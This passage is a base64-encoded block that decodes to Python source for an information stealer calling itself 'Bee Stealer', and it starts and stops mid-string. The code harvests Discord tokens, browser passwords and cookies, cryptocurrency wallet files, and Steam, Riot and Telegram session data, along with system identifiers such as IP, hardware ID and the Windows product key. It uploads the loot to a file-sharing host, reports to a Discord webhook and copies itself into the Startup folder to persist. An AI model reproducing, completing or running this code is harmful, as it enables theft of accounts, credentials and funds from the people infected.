Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYie2Jyb3dzZXJ9IgoKICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6CiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIpOiByZXR1cm4KICAgICAgICBmID0gb3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCAicisiLCBlbmNvZGluZz0idXRmOCIpCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkKICAgICAgICAjIHByaW50KGRhdGEpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKCiAgICB6ZiA9IFppcEZpbGUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiLCAidyIpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQojICAgICBsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCgogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJlb2dhZWFvZWhsZWYiIGluIGFyZzoKICAgICAgICBXYWxsZXRzWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICBlbGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWUgb3IgIlN0ZWFtIiBpbiBuYW1lIG9yICJSaW90Q2xpIiBpbiBuYW1lOgogICAgICAgIEdhbWluZ1ppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQogICAgZWxzZToKICAgICAgICBPdGhlclppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQoKCmRlZiBHYXRoZXJBbGwoKToKICAgICcgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBQYXRoIDwgMCA+ICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc05hbWUgPCAxID4gICAgICAgIFRva2VuICA8IDIgPiAgICAgICAgICAgICAgUGFzc3dvcmQgPCAzID4gICAgIENvb2tpZXMgPCA0ID4gICAgICAgICAgICAgICAgICAgICAgICAgIEV4dGVudGlvbnMgPCA1ID4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsICAgICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICAgICAgICAgIi8iLCAgICAgICAgICAgICIvTmV0d29yayIsICAgICAgICAgICAgICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLAogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXQogICAgXQoKICAgIGRpc2NvcmRQYXRocyA9IFsKICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0xpZ2h0Y29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRjYW5hcnkiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgIF0KCiAgICBQYXRoc1RvWmlwID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwKICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdLAogICAgICAgIFtmIntsb2NhbH0vUmlvdCBHYW1lcy9SaW90IENsaWVudC9EYXRhIiwgIlJpb3RDbGllbnRTZXJ2aWNlcy5leGUiLCAiUmlvdENsaWVudCJdCiAgICBdCiAgICBUZWxlZ3JhbSA9IFtmIntyb2FtaW5nfS9UZWxlZ3JhbSBEZXNrdG9wL3RkYXRhIiwgJ3RlbGVncmFtLmV4ZScsICJUZWxlZ3JhbSJdCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiAKICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0VG9rZW4sIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCiAgICBmb3IgcGF0dCBpbiBkaXNjb3JkUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HZXREaXNjb3JkLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzFdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgIFRoQ29rayA9IFtdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IAogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRDb29raWUsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkKCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HYXRoZXJaaXBzLCBhcmdzPVticm93c2VyUGF0aHMsIFBhdGhzVG9aaXAsIFRlbGVncmFtXSkuc3RhcnQoKQoKCiAgICBmb3IgdGhyZWFkIGluIFRoQ29razogdGhyZWFkLmpvaW4oKQogICAgREVURUNURUQgPSBUcnVzdChDb29raWVzKQogICAgaWYgREVURUNURUQgPT0gVHJ1ZTogcmV0dXJuCgogICAgIyBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAjICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAKICAgICMgZm9yIHBhdHQgaW4gUGF0aHNUb1ppcDoKICAgICMgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pLnN0YXJ0KCkKICAgIAogICAgIyB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUZWxlZ3JhbSwgYXJncz1bVGVsZWdyYW1bMF0sIFRlbGVncmFtWzJdLCBUZWxlZ3JhbVsxXV0pLnN0YXJ0KCkKCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCB1cHRocwogICAgdXB0aHMgPSBbXQoKICAgIGZvciBmaWxlIGluIFsid3BwYXNzdy50eHQiLCAid3Bjb29rLnR4dCJdOiAKICAgICAgICAjIHVwbG9hZChvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKQogICAgICAgIHVwbG9hZChmaWxlLnJlcGxhY2UoIi50eHQiLCAiIiksIHVwbG9hZFRvQW5vbmZpbGVzKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpKQoKZGVmIHVwbG9hZFRvQW5vbmZpbGVzKHBhdGgpOgogICAgdHJ5OnJldHVybiByZXF1ZXN0cy5wb3N0KGYnaHR0cHM6Ly97cmVxdWVzdHMuZ2V0KCJodHRwczovL2FwaS5nb2ZpbGUuaW8vZ2V0U2VydmVyIikuanNvbigpWyJkYXRhIl1bInNlcnZlciJdfS5nb2ZpbGUuaW8vdXBsb2FkRmlsZScsIGZpbGVzPXsnZmlsZSc6IG9wZW4ocGF0aCwgJ3JiJyl9KS5qc29uKClbImRhdGEiXVsiZG93bmxvYWRQYWdlIl0KICAgIGV4Y2VwdDpyZXR1cm4gRmFsc2UKCmRlZiBncmFiX3Rva2VucygpOgogICAgdG9rZW5fY291bnQgPSAwCiAgICBtZXNzYWdlID0gIiIKICAgIAogICAgbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCiAgICByb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCiAgICB0b2tlbnBhdGhzID0gewogICAgICAgICdEaXNjb3JkJzogcm9hbWluZyArICdcXERpc2NvcmQnLAogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywKICAgICAgICAnRGlzY29yZCBQVEInOiByb2FtaW5nICsgJ1xcZGlzY29yZHB0YicsCiAgICAgICAgJ0dvb2dsZSBDaHJvbWUnOiBsb2NhbCArICdcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQnLAogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywKICAgICAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcsCiAgICAgICAgJ1lhbmRleCc6IGxvY2FsICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnCiAgICB9CiAgICAKICAgIGRlZiBmaW5kX3Rva2VucyhwYXRoKToKICAgICAgICBwYXRoICs9ICdcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGInCgogICAgICAgIHRva2VucyA9IFtdCgogICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubGRiJyk6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAocidbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30nLCByJ21mYVwuW1x3LV17ODR9Jyk6CiAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgIHJldHVybiB0b2tlbnMKCiAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gdG9rZW5wYXRocy5pdGVtcygpOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkKCiAgICAgICAgaWYgbGVuKHRva2VucykgPiAwOgogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicKICAgICAgICAgICAgICAgIHRva2VuX2NvdW50ID0gdG9rZW5fY291bnQgKyAxCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcGFzcwoKICAgIHdpdGggb3BlbigidG9rZW5zLnR4dCIsICJhIikgYXMgdG9rZW5zZmlsZToKICAgICAgICB0b2tlbnNmaWxlLndyaXRlKG1lc3NhZ2UpCgogICAgZmlsZV9wYXRoID0gInRva2Vucy50eHQiCiAgICBmaWxldXJsID0gdXBsb2FkVG9Bbm9uZmlsZXMoZmlsZV9wYXRoKQogICAgcmVxdWVzdHMucG9zdChob29rLCBqc29uPXsKICAgICAgICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAidGl0bGUiOiAiQmVlID4gRGlzY29yZCBUb2tlbnMiLAogICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIioqRm91bmQgVG9rZW5zIEluOioqXG5cbltEaXNjb3JkIEFwcF0oaHR0cHM6Ly93d3cuZGlzY29yZC5jb20vKSB8IFtEaXNjb3JkIENhbmFyeV0oaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvZG93bmxvYWQvY2FuYXJ5P3BsYXRmb3JtPXdpbikgfCBbRGlzY29yZCBQVEJdKGh0dHBzOi8vZGlzY29yZC5jb20vYXBpL2Rvd25sb2FkL3B0Yj9wbGF0Zm9ybT13aW4pICB8IFtDaHJvbWVdKGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vaW50bC9lbl9pZS9jaHJvbWUvKSB8IFtPcGVyYV0oaHR0cHM6Ly93d3cub3BlcmEuY29tLykgfCBbQnJhdmUgQnJvd3Nlcl0oaHR0cHM6Ly9icmF2ZS5jb20vKSB8IFtZYW5kZXhdKGh0dHBzOi8veWFuZGV4LmNvbS8pXG5cbvCflJEgKirCtyB7dG9rZW5fY291bnR9KiogVG9rZW5zIEZvdW5kXG7wn5SXICoqwrcqKiBbQmVlVG9rZW5zLnR4dF0oe2ZpbGV1cmx9KSIsCiAgICAgICAgICAgICAgICAgICJjb2xvciI6IDEzOSwKICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJCZWUgU3RlYWxlciB8IEFyeGlmeSMwMDAxIgogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAidXNlcm5hbWUiOiAiQmVlIFN0ZWFsZXIiLAogICAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0pCgpncmFiX3Rva2VucygpCgoKZGVmIHNlbmRfc3lzdGVtX2luZm8oKToKICAgIHBjX25hbWUgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIG5vZGUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgb3NuYW1lID0gc3VicHJvY2Vzcy5ydW4oJ3dtaWMgb3MgZ2V0IENhcHRpb24nLCBjYXB0dXJlX291dHB1dD1UcnVlLCBzaGVsbD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdGxpbmVzKClbMl0uc3RyaXAoKQogICAgaXBfYWRkciA9IGdldGlwKCkKICAgIG5vZGUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQoKICAgICMgbG9jYWwgaXAKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgIHMuY29ubmVjdCgoIjguOC44LjgiLCA4MCkpCiAgICBsb2NhbF9pcCA9IHMuZ2V0c29ja25hbWUoKVswXQogICAgcy5jbG9zZSgpCgogICAgcHJvZHVjdF9rZXkgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgnd21pYyBwYXRoIHNvZnR3YXJlbGljZW5zaW5nc2VydmljZSBnZXQgT0EzeE9yaWdpbmFsUHJvZHVjdEtleScpLmRlY29kZSgpLnNwbGl0KCdcbicpWzFdLnN0cmlwKCkKICAgIGh3aWQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiKS5kZWNvZGUoKS5zcGxpdCgiXG4iKVsxXS5zdHJpcCgpCgogICAgIyBtYWMgYWRkcmVzcwogICAgaW50ZXJmYWNlLCBhZGRycyA9IG5leHQoaXRlcihwc3V0aWwubmV0X2lmX2FkZHJzKCkuaXRlbXMoKSkpCiAgICBtYWMgPSBhZGRyc1swXS5hZGRyZXNzCgogICAgI3JhbQogICAgcmFtID0gc3RyKGludChpbnQoc3VicHJvY2Vzcy5ydW4oJ3dtaWMgY29tcHV0ZXJzeXN0ZW0gZ2V0IHRvdGFscGh5c2ljYWxtZW1vcnknLCBjYXB0dXJlX291dHB1dD1UcnVlLAogICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSkuc3Rkb3V0LmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkuc3BsaXQoKVsxXSkgLyAxMDAwMDAwMDAwKSkgKyAiR0IiCgogICAgI2Nsb3NlCiAgICBncHUgPSBzdWJwcm9jZXNzLnJ1bigid21pYyBwYXRoIHdpbjMyX1ZpZGVvQ29udHJvbGxlciBnZXQgbmFtZSIsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHNoZWxsPVRydWUpLnN0ZG91dC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zcGxpdGxpbmVzKClbMl0uc3RyaXAoKQogICAgY3B1ID0gc3VicHJvY2Vzcy5ydW4oWyJ3bWljIiwgImNwdSIsICJnZXQiLCAiTmFtZSJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpLnN0ZG91dC5zdHJpcCgpLnNwbGl0KCdcbicpWzJdCgogICAgCiAgICByZXF1ZXN0cy5wb3N0KGhvb2ssIGpzb249ewogICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgImVtYmVkcyI6IFsKICAgICAgICB7CiAgICAgICAgICAidGl0bGUiOiAiQmVlID4gU3lzdGVtIEluZm9ybWF0aW9uIFN0ZWFsZXIiLAogICAgICAgICAgImRlc2NyaXB0aW9uIjogZiLwn5K7ICoqe3BjX25hbWV9Kipcblxu8J+SuyAqKlBDIFVzZXJuYW1lOioqIC0gYHtwY19uYW1lfWBcbvCflqUgKipQQyBOb2RlOioqIC0gYHtub2RlfWBcbvCfjJAgKipPUzoqKiAtIGB7b3NuYW1lfWBcblxu8J+MkCAqKklQOioqIC0gYHtpcF9hZGRyfWBcbvCfjY8gKipNQUM6KiogLSBge21hY31gXG7wn5SnICoqSFdJRDoqKiAtIGB7aHdpZH1gXG5cbvCfj7wgKipDUFU6KiogLSBge2NwdX1gXG7wn4+/ICoqR1BVOioqIC0gYHtncHV9YFxu8J+QjyAqKlJBTToqKiAtIGB7cmFtfWBcblxu8J+kkSAqKlByb2R1Y3QgS2V5OioqIC0gYHtwcm9kdWN0X2tleX1gXG7wn5alICoqTG9jYWwgSVA6KiogLSBge2xvY2FsX2lwfWAiLAogICAgICAgICAgImNvbG9yIjogMTM5LAogICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgInRleHQiOiAiQmVlIFN0ZWFsZXIgfCBBcnhpZnkjMDAwMSIKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIF0sCiAgICAgICJ1c2VybmFtZSI6ICJCZWUgU3RlYWxlciIsCiAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICB9KQoKc2VuZF9zeXN0ZW1faW5mbygpCgpkZWYgY29weV90b19zdGFydHVwKCk6CiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZiJDOlxcVXNlcnNcXHtvcy5nZXRsb2dpbigpfVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cCIpOgogICAgICAgICAgICBzaHV0aWwuY29weTIoX19maWxlX18sIGYiQzpcXFVzZXJzXFx7b3MuZ2V0bG9naW4oKX1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXAiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhc3MKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpjb3B5X3RvX3N0YXJ0dXAoKQoKIyBkZWYgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCk6cwojICAgICB0cnk6CiMgICAgICAgICBmaWxlcyA9IHsgImZpbGUiOiAocGF0aCwgb3BlbihwYXRoLCBtb2RlPSdyYicpKSB9CiMgICAgICAgICB1cGxvYWQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3RyYW5zZmVyLnNoLyIsIGZpbGVzPWZpbGVzKQojICAgICAgICAgdXJsID0gdXBsb2FkLnRleHQKIyAgICAgICAgIHJldHVybiB1cmwKIyAgICAgZXhjZXB0OgojICAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOgogICAgZ2xvYmFsIEtpd2lGaWxlcwogICAgbWF4ZmlsZXNwZXJkaXIgPSA3CiAgICBpID0gMAogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aEYpCiAgICBmZm91bmQgPSBbXQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUocGF0aEYgKyAiLyIgKyBmaWxlKTogcmV0dXJuCiAgICAgICAgaSArPSAxCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoKICAgICAgICAgICAgdXJsID0gdXBsb2FkVG9Bbm9uZmlsZXMocGF0aEYgKyAiLyIgKyBmaWxlKQogICAgICAgICAgICBmZm91bmQuYXBwZW5kKFtwYXRoRiArICIvIiArIGZpbGUsIHVybF0pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgYnJlYWsKICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoRiArICIvIiwgZmZvdW5kXSkKCktpd2lGaWxlcyA9IFtdCmRlZiBLaXdpRmlsZShwYXRoLCBrZXl3b3Jkcyk6CiAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICBmaWZvdW5kID0gW10KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGgpCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGZvciB3b3JmIGluIGtleXdvcmRzOgogICAgICAgICAgICBpZiB3b3JmIGluIGZpbGUubG93ZXIoKToKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlmb3VuZC5hcHBlbmQoW3BhdGggKyAiLyIgKyBmaWxlLCB1cGxvYWRUb0Fub25maWxlcyhwYXRoICsgIi8iICsgZmlsZSldKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSBwYXRoICsgIi8iICsgZmlsZQogICAgICAgICAgICAgICAgICAgIEtpd2lGb2xkZXIodGFyZ2V0LCBrZXl3b3JkcykKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCmRlZiBLaXdpKCk6CiAgICB1c2VyID0gdGV